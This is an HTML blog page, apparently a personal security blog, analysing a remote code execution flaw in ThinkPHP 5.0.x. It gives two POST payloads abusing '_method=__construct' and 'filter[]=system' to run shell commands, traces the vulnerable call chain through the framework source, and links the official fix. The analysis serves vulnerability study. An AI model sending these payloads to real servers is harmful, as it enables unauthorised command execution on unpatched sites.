@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html>
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="Imtinmin" />
+  
+  
+  <title>ThinkPHP5.0.x  RCE | Imtinmin的小站</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="WEB,CRYPTO," />
+  
+
+  
+  <meta name="description" content="Imtinmin的小站">
+
+  
+
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+    <script src="//unpkg.com/valine/dist/Valine.min.js" async></script>
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":true,"count":true},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2019-10-31",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Imtinmin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">Imtinmin</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 无知萌新</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/tags/" target="_self">标签</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+        <a href="/friends/" target="_self"></a>
+      
+        <a href="/about/" target="_self"></a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/Imtinmin/" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/tags/" target="_self">
+            标签
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/friends/" target="_self">
+            
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/about/" target="_self">
+            
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2019-12-01
+    </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    ThinkPHP5.0.x  RCE
+  </h1>
+  
+    <div class="passage-cover">
+      <figure style="background-image:url(https://i.loli.net/2019/12/02/WXzRjxUSDBsynYq.png);"></figure>
+    </div>
+  
+  <article class="passage-article">
+    <h1 id="ThinkPHP-5-0-22"><a href="#ThinkPHP-5-0-22" class="headerlink" title="ThinkPHP 5.0.22"></a>ThinkPHP 5.0.22</h1><h2 id="debug模式-关闭"><a href="#debug模式-关闭" class="headerlink" title="debug模式 关闭"></a>debug模式 关闭</h2><h4 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h4><p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</span><br></pre></td></tr></table></figure>
+
+<p><code>start.php</code>下断点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">App::run()-&gt;send();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (empty($dispatch)) &#123;</span><br><span class="line">    $dispatch = self::routeCheck($request, $config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>routeCheck</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public static function routeCheck($request, array $config)</span><br><span class="line">&#123;</span><br><span class="line">    $path   = $request-&gt;path();</span><br><span class="line">    $depr   = $config[&apos;pathinfo_depr&apos;];</span><br><span class="line">    $result = false;</span><br><span class="line"></span><br><span class="line">    // 路由检测</span><br><span class="line">    $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config[&apos;url_route_on&apos;];</span><br><span class="line">     ……(省略)</span><br><span class="line"></span><br><span class="line">        // 路由检测（根据路由定义返回不同的URL调度）</span><br><span class="line">        $result = Route::check($request, $path, $depr, $config[&apos;url_domain_deploy&apos;]);</span><br></pre></td></tr></table></figure>
+
+<p><code>check</code>方法内</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$method = strtolower($request-&gt;method());</span><br></pre></td></tr></table></figure>
+
+<p>跟进method<br><img src="https://uploader.shimo.im/f/lMYQlNvoXEQ1zRV2.png!thumbnail" alt="图片"></p>
+<p>config.php中定义了var_method = _method</p>
+<p><img src="https://uploader.shimo.im/f/Fol9F8y5ILkOccmB.png!thumbnail" alt="图片"></p>
+<p>当post存在<code>_method</code>参数时，会执行<code>$this-&gt;{$this-&gt;**method**}($_POST);</code></p>
+<p><code>$this-&gt;method</code> 是_method的值，也就是执行了<code>$this-&gt;__construct($_POST)</code></p>
+<p>传入的<code>__construct</code>让Request类内的成员全部被覆盖了</p>
+<p>__construct 函数不贴了</p>
+<p><code>/vendor/topthink/think-captcha/src/help.php</code></p>
+<p><img src="https://uploader.shimo.im/f/aJPtdIPRPMYlzcII.png!thumbnail" alt="图片"></p>
+<p>?s=captcha 注册了路由,使得dispatch[“type”]=”method”</p>
+<p>接着</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = self::exec($dispatch, $config);</span><br></pre></td></tr></table></figure>
+
+<p>跟进exec,type=”method”</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'method'</span>: <span class="comment">// 回调方法</span></span><br><span class="line">    $vars = array_merge(Request::instance()-&gt;param(), $dispatch[<span class="string">'var'</span>]);</span><br><span class="line">    $data = <span class="keyword">self</span>::invokeMethod($dispatch[<span class="string">'method'</span>], $vars);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里实例化了Request类，并执行param方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;mergeParam)) &#123;</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p>跟进method</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span><span class="params">($method = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $method) &#123;</span><br><span class="line">        <span class="comment">// 获取原始请求类型</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;server(<span class="string">'REQUEST_METHOD'</span>) ?: <span class="string">'GET'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>跟进server,之前覆盖掉了<code>$this-&gt;server</code> 使得<code>$this-&gt;server = [REQUEST_METHOD =&gt; &#39;ls&#39;]</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">server</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;server)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;server = $_SERVER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;server = array_merge(<span class="keyword">$this</span>-&gt;server, $name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;server, <span class="keyword">false</span> === $name ? <span class="keyword">false</span> : strtoupper($name), $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>$name=&#39;REQUEST_METHOD&#39;</code><br>最后<code>$this-&gt;server = array(&#39;REQUEST_METHOD&#39; =&gt; &#39;ls&#39;)</code></p>
+<p>跟进input</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ……省略</span><br><span class="line">        <span class="comment">// 按.拆分成多维数组进行判断</span></span><br><span class="line">        <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">                $data = $data[$val];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 无输入数据，返回默认值</span></span><br><span class="line">                <span class="keyword">return</span> $default;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">        reset($data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">        <span class="comment">// 强制类型转换</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast($data, $type);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>$data = array(&#39;REQUEST_METHOD&#39; =&gt; &#39;ls&#39;)</code>                <code>$filter=&quot;&quot;</code><br><code>$name=&quot;REQUEST_METHOD&quot;;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">        $data = $data[$val];</span><br></pre></td></tr></table></figure>
+
+<p>这里将<code>$data = $data[$name]</code>也就是<code>$data=&quot;ls&quot;;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter = $this-&gt;getFilter($filter, $default);</span><br></pre></td></tr></table></figure>
+
+<p>跟进一下<code>filter</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">protected function getFilter($filter, $default)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_null($filter)) &#123;</span><br><span class="line">        $filter = [];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $filter = $filter ?: $this-&gt;filter;</span><br><span class="line">        if (is_string($filter) &amp;&amp; false === strpos($filter, &apos;/&apos;)) &#123;</span><br><span class="line">            $filter = explode(&apos;,&apos;, $filter);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $filter = (array) $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line">    return $filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>$filter=array(&quot;system&quot;)</code>,最后把$default push进去<br>返回的<code>$filter=array(&quot;system&quot;,null)</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">    array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">    reset($data);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br></pre></td></tr></table></figure>
+
+<p>$data=”ls” 走else </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);</span><br></pre></td></tr></table></figure>
+
+<p><code>array_pop</code> 把最后的null弹出，$filter 数组只有”system” 一个元素<br>循环第一次就执行了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="string">"system"</span>, <span class="string">"ls"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>整个调用链</p>
+<p><img src="https://uploader.shimo.im/f/LxnGlQVIa8EUJBHh.png!thumbnail" alt="图片"></p>
+<h2 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=captcha</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls</span><br></pre></td></tr></table></figure>
+
+<p>param 方法执行不一样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;mergeParam)) &#123;</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 自动获取请求变量</span></span><br><span class="line">        <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $vars = [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param      = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>$this-&gt;server 为空，没执行任何命令，继续，switch($method),只有true，<br>到default</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;param      = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br></pre></td></tr></table></figure>
+
+<p>this-&gt;get(false)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;get)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;get = $_GET;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;param      = [];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get = array_merge(<span class="keyword">$this</span>-&gt;get, $name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;get, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$this-&gt;input(array(&#39;ls&#39;),false)</code></p>
+<p>跟进input</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取原始数据</span></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接返回<code>array(&#39;ls&#39;)</code><br>合并进<code>$this-&gt;param</code>,又来到<code>input</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br></pre></td></tr></table></figure>
+
+<p>跟进input</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">    array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">    reset($data);</span><br></pre></td></tr></table></figure>
+
+<p><code>$data = array(&#39;ls&#39;,id=&gt;null)</code><br>执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterValue(&amp;$value, $key, $filters)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://uploader.shimo.im/f/upcqeHG6sTk4TLSr.png!thumbnail" alt="图片"></p>
+<p><img src="https://uploader.shimo.im/f/SrMBADWsPeMHTIBn.png!thumbnail" alt="图片"></p>
+<p>整个调用</p>
+<h1 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h1><p><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></p>
+<p><img src="https://uploader.shimo.im/f/MWHMVkpcYQ8DmcQb.png!thumbnail" alt="图片"></p>
+<p>将执行Request任意方法，改成了指定的白名单内的，</p>
+<p>执行任意方法确实会出事orz</p>
+
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP-5-0-22"><span class="toc-text">ThinkPHP 5.0.22</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#debug模式-关闭"><span class="toc-text">debug模式 关闭</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#poc1"><span class="toc-text">poc1</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc2"><span class="toc-text">poc2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#官方修复"><span class="toc-text">官方修复</span></a></li></ol>
+  </div>
+</aside>
+  
+  
+    <div class="passage-tags">
+     
+      <a href="/tags/WEB/"><i class="fa fa-tags"></i>WEB</a>
+     
+      <a href="/tags/CRYPTO/"><i class="fa fa-tags"></i>CRYPTO</a>
+    
+    </div>
+  
+</div>
+
+    </main>
+    
+      
+<div class="site-comment-contanier" data-plateform="leancloud">
+  
+    <p id="site-comment-info">
+      <i class="fa fa-spinner fa-spin"></i> 评论加载中
+    </p>
+    <div id="site-comment"></div>
+  
+</div>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+      
+        <div class="site-footer-col">
+          <h5 class="site-footer-title"></h5>
+          
+            <span class="site-footer-item">
+              <a href="https://godbmw.com/" target="_blank"></a>
+            </span>
+          
+            <span class="site-footer-item">
+              <a href="http://ruanyifeng.com/" target="_blank"></a>
+            </span>
+          
+        </div>
+      
+        <div class="site-footer-col">
+          <h5 class="site-footer-title"></h5>
+          
+            <span class="site-footer-item">
+              <a href="https://godbmw.com/categories/webpack4%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/" target="_blank"></a>
+            </span>
+          
+            <span class="site-footer-item">
+              <a href="https://godbmw.com/design-patterns/" target="_blank"></a>
+            </span>
+          
+        </div>
+      
+        <div class="site-footer-col">
+          <h5 class="site-footer-title"></h5>
+          
+            <span class="site-footer-item">
+              <a href="https://juejin.im/user/5b91fcf06fb9a05d3c7fd4a5" target="_blank"></a>
+            </span>
+          
+            <span class="site-footer-item">
+              <a href="https://segmentfault.com/" target="_blank"></a>
+            </span>
+          
+        </div>
+      
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+      <div class="site-footer-info">
+        <i class="fa fa-at"></i> Email: 954093370@qq.com
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+        <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
+          
+            <div>
+              <img src="/images/wechat.jpg" alt="WeChat">
+              
+                <p>WeChat</p>
+              
+            </div>
+          
+            <div>
+              <img src="/images/alipay.png" alt="AliPay">
+              
+                <p>AliPay</p>
+              
+            </div>
+          
+        </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
